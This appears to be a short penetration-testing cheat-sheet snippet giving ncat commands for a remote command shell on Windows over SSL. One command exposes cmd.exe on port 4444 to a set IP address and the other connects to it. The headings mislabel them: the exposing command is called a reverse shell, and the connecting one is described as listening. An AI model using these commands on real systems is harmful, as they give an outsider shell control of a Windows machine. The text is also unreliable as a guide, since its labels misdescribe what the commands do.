## Establish the variable

```bash
export ip=192.168.1.100
```

### Reverse shell from windows using cmd.exe using ssl
```bash
ncat --exec cmd.exe --allow $ip -vnl 4444 --ssl
```

### Listen on port 4444 using ssl
```bash
ncat -v $ip 4444 --ssl
```
